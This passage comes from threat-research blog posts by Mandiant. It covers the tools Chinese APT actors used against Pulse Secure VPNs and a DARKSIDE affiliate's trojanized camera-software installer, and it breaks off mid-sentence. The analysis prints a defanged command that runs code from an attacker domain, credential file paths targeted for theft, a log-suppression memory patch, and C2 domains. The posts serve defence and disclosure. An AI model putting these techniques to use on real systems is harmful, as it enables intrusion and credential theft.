    appliance console rather than the web interface. The console upgrade
    process follows a separate code path that will not execute files
    such as DSUpgrade.pm.<u></u></li> <li>Previous versions of the ICT
    will exit if run on an unsupported software version. For every ICT
    scan, ensure that the ICT would have supported the device's version
  number.<u></u></li> <li>Reset all passwords in the environment.</li>
    <li>Upgrade to the most recent software version.</li> </ol>
 <p>To secure the appliance and assist with future investigations,
  consider implementing the following:</p>
 <ol> <li>Enable unauthenticated logging and configure syslog for
    Events, User &amp; Admin Access</li> <li>Forward all logs to a
    central log repository</li> <li>Review logs for unusual
    authentications and evidence of exploitation</li> <li>Regularly run
    the Integrity Checker Tool</li> <li>Apply patches as soon as they
    are made available</li> </ol>
 <h4>Geopolitical Context and Implications for U.S.-China Relations</h4>
 <p>In collaboration with intelligence analysts at BAE Systems Applied
  Intelligence, Mandiant has identified dozens of organizations across
  the defense, government, telecommunications, high tech, education,
  transportation, and financial sectors in the U.S. and Europe that have
  been compromised via vulnerabilities in Pulse Secure VPNs. Historic
  Mandiant and BAE investigations identified a significant number of
  these organizations as previous APT5 targets.</p>
 <p>Notably, compromised organizations operate in verticals and
  industries aligned with Beijing’s strategic objectives as outlined in
  China’s 14th Five Year Plan. Many manufacturers also compete with
  Chinese businesses in the high tech, green energy, and
  telecommunications sectors. Despite this, we have not directly
  observed the staging or exfiltration of any data by Chinese espionage
  actors that could be considered a violation of the Obama-Xi agreement.</p>
 <p>Targets of Chinese cyber espionage operations are often selected for
  their alignment with national strategic goals, and there is a strong
  correlation between pillar industries listed in policy white papers
  and targets of Chinese cyber espionage activity.</p>
 <p>China has outlined eight key areas of vital economic interest for
  development and production which it views as essential to maintaining
  global competitiveness, under the following categories: energy,
  healthcare, railway transportation, telecommunications, national
  defense and stability, advanced manufacturing, network power, and
  sports and culture.</p>
 <p>
  <i>Historical Context<u>
      <b></b></u></i></p>
 <p>In the <a
      href="https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-china-espionage.pdf"><i>Red
      Line Drawn</i></a><i> </i>report, Mandiant documented a
  significant decline in the volume of Chinese cyberespionage activity
  in 2014 and assessed that the restructuring of China's military and
  civilian intelligence agencies significantly impacted Chinese cyber
  operations. Then, in September 2015, President Xi of China concluded a
  bilateral agreement with U.S. President Obama to prohibit
  state-sponsored theft of intellectual property for the purpose of
  providing commercial advantage. Commercial IP theft has historically
  been a prominent characteristic of Chinese cyber espionage activity.</p>
 <p>In 2018 we conducted an extensive <a
  href="https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-executive-s05-redline-redrawn.pdf">review</a>
  of Chinese cyber espionage operations, both before and after the
  official announcement of the PLA reforms and bilateral agreement to
  determine if there were any corresponding changes in the tactics,
  techniques, and procedures (TTPs) used during Chinese cyberespionage
  operations. We observed two important changes in the type of
  information stolen and the geographic distribution of the targets.</p>
 <ul> <li>Despite examining hundreds of incidents from January 2016
    through mid 2019, we did not find definitive evidence of purely
    commercial application intellectual property theft in the US. Recent
      <a
    href="https://www.justice.gov/opa/pr/two-chinese-hackers-working-ministry-state-security-charged-global-computer-intrusion">indictments</a>
    by the US Department of Justice suggest that this theft did occur.
    While we observed other malicious activity, including geopolitical
    targeting, theft of intellectual property with military
    applications, and theft of confidential business information, we did
    not find evidence that these cyber operations violated the Obama-Xi
  agreement.</li> <li>Between January 2016 and mid-2019, the geographic
    focus of Chinese cyber operations shifted dramatically to Asia and
    away from the U.S. and Europe. While the U.S. remained the single
    most frequently targeted country, it became a much smaller
    percentage of observed activity. From 2012–2015, U.S. targeting
    constituted nearly 70 percent of all observed Chinese cyber
    espionage, while from January 2016 through August 2019, U.S.
    targeting fell to approximately 20 percent of Chinese activity.
    Targeting of Europe represented a similar proportion of overall
    Chinese activity to targeting of the Americas.</li> </ul>
 <p>
  <i>Changes in Chinese Espionage Activity between 2019 and 2021</i></p>
 <p>Based on developments observed between 2019-2021, Mandiant Threat
  Intelligence assesses that most Chinese APT actors now concentrate on
  lower-volume but more-sophisticated, stealthier operations collecting
  strategic intelligence to support Chinese strategic political,
  military, and economic goals. While some of the technical changes may
  be the result of the restructuring of China's military and civilian
  organizations, some changes possibly reflect larger technical trends
  in cyber operations overall.</p>
 <ul> <li>Before the reorganization, it was common to observe multiple
    Chinese espionage groups targeting the same organization, often
    targeting the same types of information. Post-2015, this duplication
    of efforts is rare.</li> <li>Chinese espionage groups developed more
    efficient and purposeful targeting patterns by transitioning away
    from spearphishing and relying on end user software vulnerabilities
    and instead began exploiting networking devices and web facing
    applications in novel ways. Chinese APT actors also began to
    leverage supply chain vulnerabilities and to target third party
    providers to gain access to primary targets.</li> <li>Recently
    observed Chinese cyber espionage activity exhibits an increased
    diligence in operational security, familiarity with network defender
    investigation techniques, and cognizance of the forensic evidence
    they leave behind.</li> <li>We observe the resurgence of older
    Chinese espionage groups, including APT4 and APT5 after long periods
    of dormancy and currently active groups engage in frequent and
    widespread campaigns.</li> </ul>
 <p>
  <i>Redline Withdrawn?</i></p>
 <p>The Obama-Xi agreement prohibits the theft of intellectual property
  with purely commercial applications for the purpose of gaining a
  competitive advantage. It does not cover government or diplomatic
  information, sensitive business communications, IT data, PII, or
  intellectual property with military or dual use applications.</p>
 <ul> <li>We have direct evidence of UNC2630, UNC2717 and other Chinese
    APT actors stealing credentials, email communications, and
    intellectual property with dual commercial and military
  applications.</li> <li>Throughout our investigations, we did not
    directly observe the staging or exfiltration of any data by Chinese
    espionage actors that could be considered a violation of the
    Obama-Xi agreement.</li> </ul>
 <p>Given the narrow definition of commercial intellectual property
  theft and the limited availability of forensic evidence, it is
  possible that our assessment will change with the discovery of new information.</p>
 <p>Evidence collected by Mandiant over the past decade suggests that
  norms and diplomatic agreements do not significantly limit China's use
  of its cyber threat capabilities, particularly when serving
  high-priority missions.</p>
 <p>The greater ambition and risk tolerance demonstrated by Chinese
  policymakers since 2019 indicates that the tempo of Chinese
  state-sponsored activity may increase in the near future and that the
  Chinese cyber threat apparatus presents a renewed and serious threat
  to US and European commercial entities.</p>
 <h4>Acknowledgements</h4>
 <p>Mandiant would like to thank analysts at BAE Systems Applied
  Intelligence, Stroz Friedberg, and Pulse Secure for their hard work,
  collaboration and partnership. The team would also like to thank Scott
  Henderson, Kelli Vanderlee, Jacqueline O'Leary, Michelle Cantos, and
  all the analysts who worked on Mandiant’s <i>Red Line Redrawn</i>
  project. The team would also like to thank Mike Dockry, Josh
  Villanueva, Keith Knapp, and all the incident responders who worked on
  these engagements.</p>
 <h4>Additional Resources</h4>
 <ul> <li>
    <a href="https://us-cert.cisa.gov/ncas/alerts/aa-21-110a">CISA Alert
      (AA21-110A): Exploitation of Pulse Connect Secure
  Vulnerabilities</a></li> <li>
    <a
      href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/">Pulse
      Secure Advisory SA44101: Multiple vulnerabilities resolved in
      Pulse Connect Secure / Pulse Policy Secure 9.0RX</a></li> <li>
    <a
      href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/SA44784/">Pulse
      Secure Advisory SA44784: Multiple Vulnerabilities Resolved in
      Pulse Connect Secure 9.1R11.4</a></li> <li>
    <a
      href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44764">Pulse
      Secure Customer FAQ KB44764: PCS Security Integrity Tool
  Enhancements</a></li> <li>
    <a
      href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Pulse
      Secure KB44755: Pulse Connect Secure (PCS) Integrity
  Assurance</a></li> </ul>
 <h4>Detecting the Techniques</h4>
 <p>The following table contains specific FireEye product detection
  names for the malware families associated with this updated information.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Platform(s)</b></p> </td> <td width="312" valign="top"><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Network Security</p> <p>Email
        Security</p> <p>Detection On Demand</p> <p>Malware File
        Scanning</p> <p>Malware File Storage Scanning</p> </td> <td
        width="312" valign="top"><ul>
          <li>FE_APT_Tool_Linux32_BLOODMINE_1</li>
          <li>FE_APT_Tool_Linux_BLOODMINE_1</li>
          <li>FE_APT_Tool_Linux32_BLOODBANK_1</li>
          <li>FE_APT_Tool_Linux_BLOODBANK_1</li>
          <li>FE_APT_Tool_Linux32_CLEANPULSE_1</li>
          <li>FE_APT_Tool_Linux_CLEANPULSE_1</li>
          <li>FE_APT_Webshell_PL_RAPIDPULSE_1</li>
          <li>FEC_APT_Webshell_PL_RAPIDPULSE_1</li> </ul> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Endpoint Security</p> </td> <td
        width="312" valign="top"><p>
          <b>Real-Time Detection (IOC)</b></p> <ul> <li>BLOODBANK
          (UTILITY)</li> <li>BLOODMINE (UTILITY)</li> </ul> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Helix</p> </td> <td width="312" valign="top"><p>
          <b>Establish Foothold</b></p> <ul> <li>WINDOWS METHODOLOGY
            [User Account Created]</li> <li>WINDOWS METHODOLOGY [User
            Created - Net Command]</li> </ul> <p>
          <b>Escalate Privileges</b></p> <ul> <li>WINDOWS METHODOLOGY
            [Mimikatz Args]</li> <li>WINDOWS METHODOLOGY
            [Invoke-Mimikatz Powershell Artifacts]</li> <li>WINDOWS
            METHODOLOGY [LSASS Memory Access]</li> <li>WINDOWS
            METHODOLOGY [LSASS Generic Dump Activity]</li> </ul> <p>
          <b>Internal Reconnaissance</b></p> <ul> <li>WINDOWS ANALYTICS
            [Recon Commands]</li> </ul> <p>
          <b>Move Laterally</b></p> <ul> <li>WINDOWS ANALYTICS [Abnormal
            RDP Logon]</li> <li>OFFICE 365 ANALYTICS [Abnormal
          Logon]</li> </ul> </td> </tr></tbody></table>
 <h4>Technical Annex</h4>
 <p>
  <i>BLOODMINE</i></p>
 <p>BLOODMINE is a utility for parsing Pulse Secure Connect log files.
  It extracts information related to logins, Message IDs and Web
  Requests and copies the relevant data to another file.</p>
 <p>The sample takes three command line arguments</p>
 <ol> <li>Filename to read</li> <li>Filename to write</li> <li>Timeout
  interval</li> </ol>
 <p>It parses the input file for login status codes:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>AUT31504</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>AUT24414</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>AUT22673</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>AUT22886</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>AUT23574</p> </td> </tr></tbody></table>
 <p>It parses the input file for web results code WEB20174. If it finds
  a web result code, it looks for file extensions:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>.css</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.jpg</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.png</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.gif</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.ico</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.js</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.jsp</p> </td> </tr></tbody></table>
 <p>These strings indicate the type of data that is collected from web requests:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>Web login, IP: %s, User: %s,
          Realm: %s, Roles: %s, Browser: %s</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>Agent login, IP: %s, User: %s,
          Realm: %s, Roles: %s, Client: %s</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>Logout, IP: %s, User: %s, Realm:
          %s, Roles: %s</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>Session end, IP: %s, User: %s,
          Realm: %s, Roles: %s</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>New session, IP: %s, User: %s,
          Realm: %s, Roles: %s, New IP: %s</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>Host check, Policy: %s</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>WebRequest completed, IP: %s,
          User: %s, Realm: %s, Roles: %s, %s to %s://%s:%s/%s from
        %s</p> </td> </tr></tbody></table>
 <p>
  <i>BLOODBANK</i></p>
 <p>BLOODBANK is a credential theft utility that parses two LMDB (an in
  memory database) files and expects an output file to be given at the
  command prompt. BLOODBANK takes advantage of a legitimate process that
  supports Single Sign On functionality and looks for plaintext
  passwords when they are briefly loaded in memory.</p>
 <p>The utility parses the following two files containing password
  hashes or plaintext passwords:</p>
 <ul> <li>/home/runtime/mtmp/lmdb/data0/data.mdb</li>
  <li>/home/runtime/mtmp/system</li> </ul>
 <p>BLOODBANK expects an output file as a command line parameter,
  otherwise it prints file open error. It contains the following strings
  which it likely tries to extract and target.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>PRIMARY</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>SECONDARY</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>remoteaddr</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>user@</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>logicUR</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>logicTim</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>passw@</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>userAge</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>realm</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>Sourc</p> </td> </tr></tbody></table>
 <p>
  <i>CLEANPULSE</i></p>
 <p>CLEANPULSE is a memory patching utility that may be used to prevent
  certain log events from occurring. The utility inserts two strings
  from the command line into the target process and patches code to
  conditionally circumvent a function call in the original executable.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="156"><p>File Name</p> </td> <td width="156"><p>File
        Type</p> </td> <td width="156"><p>Size</p> </td> <td
          width="156"><p>Compile Time</p> </td> </tr>
    <tr>
      <td width="156"><p>dsrlog</p> </td> <td width="156"><p>ELF.X86</p>
      </td> <td width="156"><p>13332</p> </td> <td width="156"><p> </p>
      </td> </tr></tbody></table>
 <p>The utility expects to be run from the command line as follows:</p>
 <p style="margin-left: 40.0px;">drslog &lt;pid&gt; &lt;code2_string&gt;
  &lt;code3_string&gt; &lt;command&gt;</p>
 <p>Where &lt;pid&gt; is the pid process ID to patch in memory,
  &lt;code2_string&gt; and &lt;code3_string&gt; are two strings to write
  into the target process, and &lt;command&gt; is either 'e' or 'E' for
  installation or 'u' or 'U' for uninstallation.</p>
 <p>During installation (using the 'e' or 'E' &lt;command&gt;), the
  &lt;code2_string&gt; &lt;code3_string&gt; command line strings are
  written to the target process at hard-coded memory addresses, a small
  amount of code is written, and a jump instruction to the code snippet
  is patched in memory of the target process. The added code checks
  whether an argument is equal to either &lt;code2_string&gt;
  &lt;code3_string&gt; strings, and if, so skips a function call in the
  target process.</p>
 <p>During uninstall (using the 'u' or 'U' &lt;command&gt;) the patch
  jump location is overwritten with what appears to be the original 8
  bytes of instructions, and the two additional memory buffers and the
  code snippet appear to be overwritten with zeros.</p>
 <p>The CLEANPULSE utility is highly specific to a victim environment.
  It does not contain any validation code when patching (i.e. verifying
  that code is expected prior to modifying it), and it contains
  hard-coded addresses to patch.</p>
 <p>The target code to patch appears to be the byte sequence: 89 4C 24
  08 FF 52 04. This appears as the last bytes in the patched code, and
  is the 8-bytes written when the uninstall 'u' command is given.</p>
 <p>These bytes correspond to the following two instructions:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><p>.data:0804B138 89 4C 24
          08                 mov     [esp+8], ecx</p> </td> </tr>
    <tr>
      <td width="624" valign="top"><p>.data:0804B13C FF 52
          04                       call    dword ptr [edx+4]</p> </td> </tr></tbody></table>
 <p>This byte sequence occurs at the hard-coded patch address the
  utility expects, dslogserver. Based on status and error messages in
  nearby functions the executable dslogserver appears to be related to
  log event handling, and the purpose of the CLEANPULSE utility may be
  to prevent certain events from being logged.</p>
 <p>There are several un-referenced functions that appear to have been
  taken from the open source project PUPYRAT. It is likely that the
  actor re-purposed this open source code, using PUPYRAT as a simple
  template project.</p>
 <p>
  <i>RAPIDPULSE</i></p>
 <p>RAPIDPULSE is a webshell capable of arbitrary file read. As is
  common with other webshells, RAPIDPULSE exists as a modification to a
  legitimate Pulse Secure file.</p>
 <p>The webshell modifies the legitimate file's main routine which
  compares the HTTP query parameter with key name: deviceid to a
  specific  key with value. If the parameter matches, then the sample
  uses an RC4 key  to decrypt HTTP query parameter with key name:
  hmacTime. This decrypted value is a filename which the sample then
  opens, reads, RC4 encrypts with the same key, base64 encodes, then
  writes to stdout. The appliance redirects stdout as the response to
  HTTP requests. This serves as an encrypted file download for the attacker.</p>
 <h4>Integrity Checker Tool and Other Validation Checks</h4>
 <p>In our public report, we noted two code families that
  manipulate check_integrity.sh, a legitimate script used during a
  normal system upgrade. This validation script was modified by the
  actor to exit early so that it would not perform the intended checks.</p>
 <p>Per Ivanti, the validation provided by check_integrity.sh is a
  separate validation feature and not the same as the <a
    href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Integrity
    Checker Tool (ICT)</a> available on their website. They recommend
  that organizations use the online ICT to confirm that hashes of files
  on their Pulse Secure devices match Ivanti’s list of known good
  hashes. Please note that the ICT does not scan the rollback partition.</p>
http://www.fireeye.com/blog/threat-research/2021/05/updates-on-chinese-apt-compromising-pulse-secure-vpn-devices.html2021-05-27T17:00:00.000Z2021-07-14T15:35:35.959ZSmoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromisenoemail@noemail.orgTyler McLellan<p>Mandiant observed DARKSIDE affiliate UNC2465 accessing at least one
  victim through a Trojanized software installer downloaded from a
  legitimate website. While this victim organization detected the
  intrusion, engaged Mandiant for incident response, and avoided
  ransomware, others may be at risk.</p>
 <p>As reported in the Mandiant post, &quot;<a
    href="/content/fireeye-www/en_US/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html">Shining
    a Light on DARKSIDE Ransomware Operations</a>,&quot; Mandiant
  Consulting has investigated intrusions involving several DARKSIDE
  affiliates. UNC2465 is one of those DARKSIDE affiliates that Mandiant
  believes has been active since at least March 2020.</p>
 <p>The intrusion that is detailed in this post began on May 18, 2021,
  which occurred days after the publicly reported shutdown of the
  overall DARKSIDE program (<a
    href="https://advantage.mandiant.com/reports/21-00010945">Mandiant
    Advantage background</a>). While no ransomware was observed here,
  Mandiant believes that affiliate groups that have conducted DARKSIDE
  intrusions may use multiple ransomware affiliate programs and can
  switch between them at will.</p>
 <p>Sometime in May 2021 or earlier, UNC2465 likely Trojanized two
  software install packages on a CCTV security camera provider website.
  Mandiant determined the installers were malicious in early June and
  notified the CCTV company of a potential website compromise, which may
  have allowed UNC2465 to replace legitimate downloads with the
  Trojanized ones.</p>
 <p>While Mandiant does not suspect many victims were compromised, this
  technique is being reported for broader awareness. Software supply
  chain attacks can vary greatly in sophistication, from the recent
  FireEye-discovered <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html">SolarWinds
  attacks</a> to attacks such as this targeting smaller providers. A
  software supply chain attack allows a single intrusion to obtain the
  benefit of access to all of the organizations that run that victim
  company’s software; in this case, an installer, rather than the
  software itself, was modified by UNC2465.</p>
 <h4>DARKSIDE RaaS</h4>
 <p>In mid-May 2021, Mandiant observed multiple threat actors cite an
  announcement that appeared to be shared with DARKSIDE RaaS affiliates
  by the operators of the service. This announcement stated that they
  lost access to their infrastructure, including their blog, payment,
  and content distribution network (CDN) servers, and would be closing
  their service. The post cited law enforcement pressure and pressure
  from the United States for this decision. </p>
 <p>Multiple users on underground forums have since come forward
  claiming to be unpaid DARKSIDE affiliates, and in some cases privately
  provided evidence to forum administrators who confirmed that their
  claims were legitimate. There are some actors who have speculated that
  the DARKSIDE operator’s decision to close could be an exit scam. While
  we have not seen evidence suggesting that the operators of
  the DARKSIDE service have resumed operations, we anticipate that at
  least some of the former affiliates of the DARKSIDE service will
  likely identify different ransomware or malware offerings to use
  within their own operations. </p>
 <p>Notably, Mandiant has continued to observe a steady increase in the
  number of publicly named victims on ransomware shaming sites within
  the past month. Despite the recent ban of ransomware-related posts
  within underground forums, threat actors can still leverage private
  chats and connections to identify ransomware services. As one example,
  in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS
  indicated that multiple affiliates from other RaaS platforms that had
  shut down were switching to their service. Based on the perceived
  profitability of these operations, it is almost certain that numerous
  threat actors will continue to conduct widespread ransomware
  operations for the foreseeable future.</p>
 <h4>Background</h4>
 <p>In June 2021, Mandiant Consulting was engaged to respond to an
  intrusion. During analysis, Mandiant determined the initial vector was
  a trojanized security camera PVR installer from a legitimate website.
  Mandiant attributed the overall intrusion activity to DARKSIDE
  affiliate UNC2465 due to continued use of infrastructure and tooling
  since October 2020.</p>
 <p>On May 18, 2021, a user in the affected organization browsed to the
  Trojanized link and downloaded the ZIP. Upon installing the software,
  a chain of downloads and scripts were executed, leading to SMOKEDHAM
  and later NGROK on the victim’s computer. Additional malware use such
  as BEACON, and lateral movement also occurred. Mandiant believes the
  Trojanized software was available from May 18, 2021, through June 8, 2021.</p>
 <p>Pivoting on the slightly modified, but benign, MSHTA.exe application
  in VirusTotal, Mandiant identified a second installer package with the
  MD5 hash, e9ed774517e129a170cdb856bd13e7e8
  (SVStation_Win64-B1130.1.0.0.exe), from May 26, 2021, which also
  connects out the same URL as the Trojanized SmartPSS installer.</p>
 <h4>Supply Chain Intrusion Cycle</h4>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Intrusion cycle</span></p>
 <h4>Phase 1: Trojanized Installer Download</h4>
 <p>Mandiant Consulting observed the Trojanized installer downloaded on
  a Windows workstation after the user visited a legitimate site that
  the victim organization had used before.</p>
 <p>The downloaded file was extracted to<br /> C:\Users\[username]\Downloads\06212019-General-SMARTPSS-Win32-ChnEng-IS\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe.</p>
 <p>Mandiant confirmed the user intended to download, install, and use
  the SmartPSS software. Figure 2 shows an image of the download page
  used for SmartPSS software.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: SmartPSS download page</span></p>
 <h4>Phase 2: Nullsoft Installer</h4>
 <p>The installer executable is a Nullsoft installer that when executed
  wrote two files to C:\ProgramData\SMARTPSS-Win32_ChnEng_IS. We were
  able to extract the malicious installer script and files for analysis
  using 7-Zip. The relevant section of this installer script is shown
  below in Figure 3.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Nullsoft installer script section</span></p>
 <p>The installer script created two files:
  SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe
  (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe
  (c180f493ce2e609c92f4a66de9f02ed6). The former is a clean installer
  from the original developer and is launched first, installing the
  software as the user may expect. The latter is launched with a command
  line URL executing the content.</p>
 <p>The smartpss.exe file contained metadata describing itself as
  MSHTA.exe from Microsoft, a legitimate operating system component, but
  the MD5 hash was unknown. Disassembly analysis of the program showed
  it was a small application that loaded the IE COM object and launched
  the function RunHTMLApplication() against the command line argument
  provided. This functionality matched the behavior of the legitimate
  MSHTA.exe despite the hash discrepancy. Further analysis showed that
  the malware was based on a 2018 version of the binary (original hash:
  5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data
  appended, as shown in Figure 4.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: CyberChef diff between
    MSHTA.exe and smartpss.exe</span></p>
 <h4>Phase 3: Downloaded VBScript and PowerShell</h4>
 <p>Upon execution, the modified Mshta file was executed with the URL,
  hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the
  command line.</p>
 <p>Domain sdoc[.]xyz was first associated with UNC2465 by <a
  href="https://staging.community.riskiq.com/article/fdf74f23">RiskIQ</a>
  in a May 20, 2021, blog post researching the infrastructure that
  Mandiant previously reported. According to RiskIQ, sdoc[.]xyz shares a
  registrant with koliz[.]xyz, which was also observed by Mandiant in
  past UNC2465 intrusions.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span
            class="code">C:\PROGRAMDATA\SMARTPSS-Win32_ChnEng_IS\smartpss.exe
        hxxp://sdoc[.]xyz/ID-508260156241</span></p> </td> </tr></tbody></table>
 <p>The execution of the modified Mshta file resulted in the creation of
  a HTM file called loubSi78Vgb9[1].htm that was written to a temporary
  INetCache directory. Mandiant was not able to acquire this file at the
  time of writing; however, Mandiant was able to recover partial
  contents of the file.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">&lt;html&gt;&lt;head&gt;..&lt;script
            language='VBScript'&gt;..On Error Resume Next</span></p>
      </td> </tr></tbody></table>
 <p>At the time of writing, sdoc[.]xyz appeared to be active, but not
  returning the VBScript code. It is not clear if sdoc[.]xyz was
  selecting victims based on IP or other properties or was simply
  dormant. A PCAP from a sandbox execution on VirusTotal from May 26,
  2021, also showed benign content being served.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: PCAP from
    e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning
    malicious content</span></p>
 <p>Shortly after the download, a PowerShell script block was executed
  to download SMOKEDHAM, as shown in Figure 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: SMOKEDHAM downloader</span></p>
 <p>Within seconds, a file named qnxfhfim.cmdline was written to disk
  and executed using the Command-Line Compiler.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">csc.exe /noconfig /fullpaths @'C:\Users\
        [username]\AppData\Local\Temp\qnxfhfim\qnxfhfim.cmdline'</span></p>
      </td> </tr></tbody></table>
 <p>Mandiant was not able to recover this file at the time of writing;
  however, Mandiant was able to recover partial contents of the file.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">.../t:library /utf8output /R:'System.dll'
        /R:'C:\windows\Microso</span></p> </td> </tr></tbody></table>
 <p>After the execution of qnxfhfim.cmdline, PowerShell initiated the
  first connection to the fronted domain
  lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.</p>
 <h4>Phase 4: SMOKEDHAM Dropper</h4>
 <p>The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written
  in PowerShell and decrypts and executes in memory the SMOKEDHAM
  backdoor. The dropper uses the Add-Type cmdlet to define a new .NET
  class for the backdoor. The Add-Type cmdlet can be used to define a
  new .NET class using an existing assembly or source code files or
  specifying source code inline or saved in a variable. In this case,
  the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.</p>
 <p>The SMOKEDHAM backdoor source code is embedded as an encrypted
  string. The dropper uses the ConvertTo-SecureString cmdlet and an
  embedded key to decrypt the source code prior to executing the
  Add-Type cmdlet. After defining a new .NET class for the backdoor, the
  dropper executes the backdoor's entry point. The dropper configures
  the backdoor with a C2 server address, RC4 encryption key, and sleep
  interval. Figure 7 shows the deobfuscated SMOKEDHAM dropper.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: SMOKEDHAM dropper</span></p>
 <h4>Phase 5: SMOKEDHAM Backdoor</h4>
 <p>SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based
  backdoor that supports commands, including screen capture and
  keystroke capture. The backdoor may also download and execute
  additional PowerShell commands from its command and control (C2) server.</p>
 <h5>SMOKEDHAM Network Communications</h5>
 <p>SMOKEDHAM communicates with its C2 server using HTTPS. The backdoor
  uses domain fronting to obfuscate its true C2 server. The fronted
  domain is configured by an earlier stage of execution and the actual
  domain is hard-coded in the backdoor. Mandiant observed the fronted
  domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain
  max-ghoster1.azureedge[.]net used for C2 server communication.</p>
 <p>The communication between SMOKEDHAM and its C2 server consists of
  JSON data exchanged via HTTP POST requests. The backdoor initiates
  requests to the C2 server and the C2 server may include commands to
  execute in the responses. The JSON data exchanged between SMOKEDHAM
  and its C2 server contains three fields: ID, UUID, and Data.</p>
 <p>The ID field contains a unique value generated by the backdoor for
  the target system.</p>
 <p>The UUID field may contain a unique value used to track command
  output or be empty. When the C2 server responds with a command to
  execute, it sets the UUID field to a unique value. SMOKEDHAM then sets
  the same UUID value in the subsequent HTTP POST request that contains
  the command output.</p>
 <p>The Data field may contain RC4-encrypted, Base64-encoded command
  data or be empty. The backdoor uses the Data field to send command
  output to its C2 server. The C2 server uses the Data field to send
  commands to the backdoor to execute. The backdoor uses an RC4 key
  configured by an earlier stage of execution to encrypt and decrypt the
  Data field. Mandiant observed the RC4 key
